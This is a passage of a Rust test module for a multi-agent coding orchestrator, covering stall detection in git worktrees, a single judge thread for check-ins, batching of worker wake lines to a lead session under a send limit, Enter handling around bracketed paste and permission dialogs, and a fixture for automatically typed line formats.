        fail(&mut f, "Claude is not signed in");
        assert_eq!(f.stall_cards(), cards);
        fail(&mut f, "Claude reached its usage limit");
        assert!(f.stall_cards().is_empty());
    }
    #[test]
    fn progress_clears_the_stall_card() {
        let (mut f, child, wt) = seated("moved");
        for _ in 0..3 {
            f.check_in(&child);
        }
        assert_eq!(f.stall_cards().len(), 1);
        // An uncommitted change to a tracked file is progress: the card goes at the next check-in.
        fs::write(wt.join("a.txt"), "two\n").unwrap();
        f.check_in(&child);
        assert!(f.stall_cards().is_empty());
        // Stuck again: a new card. So is a commit progress, and a change of the task's record (a review).
        f.check_in(&child);
        f.check_in(&child);
        assert_eq!(f.stall_cards().len(), 1);
        git(&wt, &["commit", "-qam", "two"]);
        f.check_in(&child);
        assert!(f.stall_cards().is_empty());
        f.check_in(&child);
        let ledger = crate::ledger::Ledger::open(&f.home);
        let review = crate::ledger::Review {
            revision: "r".into(),
            pass: false,
            note: String::new(),
            by: "user".into(),
            name: "user".into(),
            at: 9,
        };
        ledger.review("t1", review).unwrap();
        f.check_in(&child);
        assert!(f.stall_cards().is_empty(), "the review moved the task");
        // A closed task keeps no card.
        f.check_in(&child);
        f.check_in(&child);
        assert_eq!(f.stall_cards().len(), 1);
        ledger.close("t1", "dropped", 10).unwrap();
        f.core.retire_merge_card("t1").unwrap();
        assert!(f.stall_cards().is_empty());
    }
    /// Round 2 (Codex MUST): turn ends that come while a judge is busy start no second judge and wait as one check-in
    /// per task (the newest); the one judge then reads each task once.
    #[test]
    fn check_ins_that_wait_are_one_per_task_for_one_judge() {
        use std::sync::atomic::{AtomicBool, Ordering::SeqCst};
        let home = scratch("judge");
        let wt = home.join("wt");
        fs::create_dir_all(&wt).unwrap();
        git(&wt, &["init", "-q"]);
        fs::write(wt.join("a.txt"), "one\n").unwrap();
        git(&wt, &["add", "a.txt"]);
        git(&wt, &["commit", "-qm", "one"]);
        let ledger = crate::ledger::Ledger::open(&home);
        let tax = ledger.worktree_made(&home, "lead", &wt, "tax", 1).unwrap();
        let (docs, _) = ledger
            .make(&home, Some("lead"), "docs", &[], false, 1)
            .unwrap();
        let registry = std::sync::Arc::new(std::sync::Mutex::new(Sessions::open(&home).unwrap()));
        let seat = store::new_id().unwrap();
        let due = |task: &crate::ledger::Task, error: Option<&str>| crate::ledger::CheckIn {
            task: task.clone(),
            session: seat.clone(),
            name: "w1".into(),
            error: error.map(Into::into),
        };
        // Twenty turn ends of each task's seats: quiet ones on `tax`, failed ones on `docs`.
        let turns = || {
            let mut core = registry.lock().unwrap();
            for _ in 0..20 {
                core.check_in_due(due(&tax, None));
                core.check_in_due(due(&docs, Some("an earlier error")));
                core.check_in_due(due(&docs, Some("failed")));
            }
        };
        let stall = |id: &str| {
            let all = ledger.list().unwrap();
            all.into_iter().find(|t| t.id == id).unwrap().stall
        };
        // A judge is busy: no second one starts, and what waits is one check-in per task.
        let busy = std::sync::Arc::new(AtomicBool::new(true));
        turns();
        Sessions::start_judge(&registry, &home, &busy);
        std::thread::sleep(std::time::Duration::from_millis(200));
        assert_eq!(registry.lock().unwrap().check_ins.len(), 2);
        assert_eq!((stall(&tax.id), stall(&docs.id)), (None, None));
        // It ends: the next tick starts one judge, which reads each task once (the newest check-in of each).
        busy.store(false, SeqCst);
        let judge = || {
            Sessions::start_judge(&registry, &home, &busy);
            let until = std::time::Instant::now() + std::time::Duration::from_secs(20);
            while busy.load(SeqCst) && std::time::Instant::now() < until {
                std::thread::sleep(std::time::Duration::from_millis(20));
            }
            assert!(!busy.load(SeqCst) && registry.lock().unwrap().check_ins.is_empty());
        };
        judge();
        let (a, b) = (stall(&tax.id).unwrap(), stall(&docs.id).unwrap());
        assert_eq!((a.quiet, b.same, b.error.as_str()), (0, 1, "failed"));
        // Twenty more of each count as one more, and the third round stalls both: one card per task.
        for round in 2..=3 {
            turns();
            judge();
            let (a, b) = (stall(&tax.id).unwrap(), stall(&docs.id).unwrap());
            assert_eq!((a.quiet, b.same), (round - 1, round));
        }
        let cards = registry.lock().unwrap().queue.owner_items();
        assert_eq!(cards.len(), 2);
        // Nothing waits: no judge starts.
        Sessions::start_judge(&registry, &home, &busy);
        assert!(!busy.load(SeqCst));
        let _ = fs::remove_dir_all(home);
    }
    /// Ticket 1056: three workers of one lead, each with a queued wake line; the lead becomes ready to take a send.
    fn three_waiting(name: &str) -> (Fix, String, Vec<String>) {
        let (mut f, parent, w1) = Fix::pair(name);
        let mut workers = vec![w1];
        for n in 2..=3 {
            let id = f.session(&format!("w{n}"), &f.home.join(format!("w{n}")));
            f.core.grants.parents.insert(id.clone(), parent.clone());
            workers.push(id);
        }
        for w in &workers {
            f.finish_turn(w);
            f.core.wake_parents();
        }
        (f, parent, workers)
    }
    fn statuses(f: &Fix, id: &str) -> Vec<(String, String)> {
        let meta = &f.core.entries[id].meta;
        meta.send_log
            .iter()
            .chain(&meta.send_queue)
            .map(|s| (s.content.clone(), s.status.clone()))
            .collect()
    }
    #[test]
    fn a_user_row_goes_before_queued_wake_lines() {
        let (mut f, parent, _) = three_waiting("user-first");
        assert_eq!(
            f.core.entries[&parent].meta.send_queue.len(),
            3,
            "the lead is not ready: queued"
        );
        f.core
            .handle(Request::AgentPrompt {
                id: parent.clone(),
                text: "owner words".into(),
            })
            .unwrap();
        f.finish_turn(&parent);
        assert!(f.core.deliver().unwrap());
        let delivered: Vec<_> = statuses(&f, &parent)
            .into_iter()
            .filter(|(_, s)| s == "delivered")
            .collect();
        assert_eq!(
            delivered,
            [("owner words".to_string(), "delivered".to_string())]
        );
    }
    #[test]
    fn a_newer_wake_line_replaces_the_older_one_of_its_worker() {
        let (mut f, parent, child) = Fix::pair("one-per-worker");
        f.finish_turn(&child);
        f.core.wake_parents();
        f.finish_turn(&child);
        f.core.wake_parents();
        let queue = &f.core.entries[&parent].meta.send_queue;
        assert_eq!(queue.len(), 1, "{:?}", statuses(&f, &parent));
        assert_eq!(
            f.core.entries[&parent]
                .meta
                .send_log
                .iter()
                .filter(|s| s.status == "canceled")
                .count(),
            1
        );
    }
    #[test]
    fn queued_wake_lines_go_out_as_one_message() {
        let (mut f, parent, _) = three_waiting("one-message");
        f.finish_turn(&parent);
        assert!(f.core.deliver().unwrap());
        assert!(f.core.entries[&parent].meta.send_queue.is_empty());
        let log = &f.core.entries[&parent].meta.send_log;
        let whole: Vec<_> = log
            .iter()
            .filter(|s| s.content.lines().count() == 3)
            .collect();
        assert_eq!(whole.len(), 1, "{:?}", statuses(&f, &parent));
        for name in ["w1", "w2", "w3"] {
            assert!(
                whole[0].content.contains(&format!("worker {name} ")),
                "{}",
                whole[0].content
            );
        }
    }
    /// Queues `n` wake lines of `line` from `child` to `parent`, as wake.rs does.
    fn queue_wakes(f: &mut Fix, child: &str, parent: &str, n: usize, line: &str) {
        for _ in 0..n {
            let send = f
                .core
                .begin_send(child, parent, line.into(), vec![], true, "queued")
                .unwrap();
            f.core.wake_rows.insert(send.id);
        }
    }
    /// Ticket 1056 (Codex look, MUST 1): a joined row above the send limit was saved, and the next core refused to load.
    #[test]
    fn a_wake_batch_stays_inside_the_send_limit_across_a_restart() {
        let (mut f, parent, child) = Fix::pair("batch-limit");
        let line = format!("worker w1 {}", "x".repeat(798)); // 808 bytes, 100 of them pass the limit
        queue_wakes(&mut f, &child, &parent, 100, &line);
        f.finish_turn(&parent);
        f.core.deliver().unwrap();
        let meta = &f.core.entries[&parent].meta;
        assert!(
            meta.send_log
                .iter()
                .chain(&meta.send_queue)
                .all(|s| s.content.len() <= crate::delivery::SEND_LIMIT)
        );
        assert!(
            meta.send_queue.iter().any(|s| s.status == "queued"),
            "the lines past the limit wait for the next batch"
        );
        f.core.save().unwrap();
        // The restart: a new core opens what this one saved.
        let copy = scratch("batch-limit-copy");
        fs::copy(f.home.join("sessions.json"), copy.join("sessions.json")).unwrap();
        let reopened = Sessions::open(&copy);
        let _ = fs::remove_dir_all(&copy);
        assert!(reopened.is_ok(), "{:?}", reopened.err());
    }
    /// Ticket 1056 (Codex look, MUST 2): the joined lines wait for the batch's Enter, and a dropped Enter fails them all.
    #[test]
    fn joined_wake_lines_end_with_their_batch() {
        let mut f = Fix::new("batch-enter");
        // An agent with bracketed paste on: the batch is pasted and its Enter waits for a later pass.
        fs::write(
            f.home.join("idle.sh"),
            "#!/bin/sh\nstty raw -echo\nprintf '\\033[?2004h'\ni=0; while [ ! -f stop ] && [ $i -lt 2400 ]; do sleep 0.05; i=$((i+1)); done\n",
        )
        .unwrap();
        let parent = f.session("coord", &f.home.clone());
        f.core.entries.get_mut(&parent).unwrap().meta.kind = AgentKind::Claude;
        let child = f.session("w1", &f.home.join("w1"));
        f.core.grants.parents.insert(child.clone(), parent.clone());
        let paste = |f: &Fix| {
            f.core.entries[&parent]
                .pty
                .as_ref()
                .is_some_and(Pty::bracketed_paste)
        };
        for _ in 0..100 {
            if paste(&f) {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert!(paste(&f), "the fake agent turned bracketed paste on");
        queue_wakes(&mut f, &child, &parent, 3, "worker w1 done");
        f.finish_turn(&parent);
        f.core.deliver().unwrap();
        assert!(
            f.core.pending_enter.contains_key(&parent),
            "the Enter waits"
        );
        assert!(
            f.core.entries[&parent]
                .meta
                .send_queue
                .iter()
                .all(|s| s.status == "attempting"),
            "{:?}",
            statuses(&f, &parent)
        );
        // A permission dialog comes up before the Enter: the Enter is dropped.
        f.core
            .queue
            .observe(
                &parent,
                "PermissionRequest",
                &serde_json::json!({"tool_name": "Bash", "tool_input": {"command": "ls"}}),
                "hook",
                queue::now_ms(),
            )
            .unwrap();
        for _ in 0..40 {
            if !f.core.pending_enter.contains_key(&parent) {
                break;
            }
            f.core.flush_enters().unwrap();
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        // Ticket 1085: the batch is queued again once (cleared from the box before its next write), its joined lines
        // still with it; a second dropped Enter fails them all.
        let batch = |f: &Fix| {
            let meta = &f.core.entries[&parent].meta;
            let mut s: Vec<_> = meta
                .send_queue
                .iter()
                .chain(&meta.send_log)
                .filter(|s| s.sender == child)
                .map(|s| s.status.clone())
                .collect();
            s.sort();
            s
        };
        assert_eq!(
            batch(&f),
            ["attempting", "attempting", "queued"],
            "{:?}",
            statuses(&f, &parent)
        );
        assert!(f.core.left_typed.contains(&parent));
        let row = f.core.entries[&parent]
            .meta
            .send_queue
            .iter()
            .find(|s| s.status == "queued")
            .unwrap()
            .clone();
        f.core.finish_send(&parent, &row.id, "attempting").unwrap();
        assert_eq!(f.core.write_send(&parent, &row), Ok(true));
        for _ in 0..40 {
            if !f.core.pending_enter.contains_key(&parent) {
                break;
            }
            f.core.flush_enters().unwrap();
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        let meta = &f.core.entries[&parent].meta;
        assert!(meta.send_queue.is_empty(), "{:?}", statuses(&f, &parent));
        assert_eq!(batch(&f), ["failed"; 3], "{:?}", statuses(&f, &parent));
    }
    #[test]
    fn a_closed_workers_wake_line_is_dropped() {
        let (mut f, parent, child) = Fix::pair("closed-worker");
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.core.entries[&parent].meta.send_queue.len(), 1);
        f.core.handle(Request::Close { id: child.clone() }).unwrap();
        f.finish_turn(&parent);
        f.core.deliver().unwrap();
        assert_eq!(
            statuses(&f, &parent),
            [(
                "worker w1 ended a turn (no report yet)".to_string(),
                "canceled".to_string()
            )]
        );
    }
    /// Ticket 1085: every automatic line form the core types into a seat's input box (wake lines here, the room's notice,
    /// auto-advance's heartbeat and nudge through `core_line`), against the shared fixture the web spec folds
    /// (web/tests/wake-lines-1085.spec.ts). A new form fails here until the fixture, and so the fold, has it.
    #[test]
    fn automatic_line_forms_match_the_shared_fixture() {
        let mut made: Vec<serde_json::Value> = vec![];
        let mut add =
            |kind: &str, text: String| made.push(serde_json::json!({"kind": kind, "text": text}));
        for reached in [
            Reached::Done,
            Reached::BlockedQuestion,
            Reached::BlockedPermission,
            Reached::AsksLead,
            Reached::Failed,
            Reached::Exited,
        ] {
            add("wake", line("w1", "id", reached, None));
            add(
                "wake",
                line(
                    "Builder · ticket 1070",
                    "id",
                    reached,
                    Some("STATUS: done \"quoted\""),
                ),
            );
        }
        add("notice", crate::room::notice(1));
        add("notice", crate::room::notice(2));
        for (review, merge, stalled) in [
            (1, 0, 0),
            (2, 0, 0),
            (0, 1, 0),
            (0, 2, 0),
            (0, 0, 1),
            (0, 0, 2),
            (0, 2, 1),
            (1, 1, 1),
            (2, 2, 2),
        ] {
            add(
                "heartbeat",
                crate::advance::beat_line(review, merge, stalled).unwrap(),
            );
        }
        assert_eq!(crate::advance::beat_line(0, 0, 0), None);
        add("nudge", crate::advance::nudge_line(15));
        add(
            "forward",
            crate::advance::forward_line(
                "Reviewer · tax",
                "0123456789abcdef fedcba9876543210",
                "two MUSTs. See sessions.rs",
                1,
            ),
        );
        // Task dependencies: what a landing freed, and a dropped task's waiters.
        add("release", crate::advance::landed_line("a", &["b"], &[]));
        add(
            "release",
            crate::advance::landed_line("a", &["b", "c"], &[("d", 1)]),
        );
        add(
            "release",
            crate::advance::landed_line("a", &[], &[("d", 2)]),
        );
        add("release", crate::advance::dropped_line("a", &[("b", "t2")]));
        add(
            "release",
            crate::advance::dropped_line("a", &[("b", "t2"), ("c", "t3")]),
        );
        let fixture: serde_json::Value =
            serde_json::from_str(include_str!("../../tests/fixtures/automatic-lines.json"))
                .unwrap();
        assert_eq!(
            fixture["lines"],
            serde_json::Value::Array(made.clone()),
            "the fixture must list exactly these forms:\n{}",
            serde_json::to_string_pretty(&serde_json::json!({"lines": made})).unwrap()
        );
    }
    #[test]
    fn hidden_copies_use_shared_set() {
        assert_eq!(
            super::one_line("ok\u{061C} do\u{E0041}ne\u{202E}"),
            "ok done"
        );
    }
}
